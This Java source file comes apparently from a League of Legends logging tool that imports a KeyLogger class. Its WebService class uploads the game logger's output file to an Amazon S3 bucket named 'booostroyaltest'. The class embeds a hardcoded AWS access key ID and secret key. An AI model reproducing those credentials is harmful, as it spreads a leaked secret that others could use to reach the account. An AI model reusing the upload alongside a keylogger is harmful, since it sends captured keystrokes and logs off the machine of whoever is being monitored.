import com.amazonaws.AmazonClientException;
import com.amazonaws.AmazonServiceException;
import com.amazonaws.auth.AWSCredentials;
import com.amazonaws.auth.BasicAWSCredentials;
import com.amazonaws.services.s3.AmazonS3;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.PutObjectRequest;
import logger.KeyLogger;
import logger.LolGameLogger;

import java.io.File;
import java.io.IOException;

public class WebService {

    private final String bucketName = "booostroyaltest";
    private final String basePath = System.getProperty("user.dir");
    private static final String accessKey = "AKIAJNQY57TDNCL7PT2A";
    private static final String secretKey = "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";

    private String keyName;
    private String uploadFileName;


    public WebService(String uploadFileName, String keyName)
    {
        this.uploadFileName =  basePath + "/" + uploadFileName;
        this.keyName = keyName + "/" + LolGameLogger.getInstance().getFileName();
    }

    public static AWSCredentials createAWSCredentials(){
        AWSCredentials credentials = new BasicAWSCredentials(accessKey, secretKey);
        return credentials;
    }

    public void WebService() throws IOException {
        AmazonS3 s3client = new AmazonS3Client(createAWSCredentials());

        try {
            System.out.println("Uploading a new object to S3 from a file\n");
            File file = new File(uploadFileName);
            s3client.putObject(new PutObjectRequest(
                    bucketName, keyName, file));
        } catch (AmazonServiceException ase) {
            System.out.println("Caught an AmazonServiceException, which " +
                    "means your request made it " +
                    "to Amazon S3, but was rejected with an error response" +
                    " for some reason.");
            System.out.println("Error Message:    " + ase.getMessage());
            System.out.println("HTTP Status Code: " + ase.getStatusCode());
            System.out.println("AWS Error Code:   " + ase.getErrorCode());
            System.out.println("Error Type:       " + ase.getErrorType());
            System.out.println("Request ID:       " + ase.getRequestId());
        } catch (AmazonClientException ace) {
            System.out.println("Caught an AmazonClientException, which " +
                    "means the client encountered " +
                    "an internal error while trying to " +
                    "communicate with S3, " +
                    "such as not being able to access the network.");
            System.out.println("Error Message: " + ace.getMessage());
        }
    }
}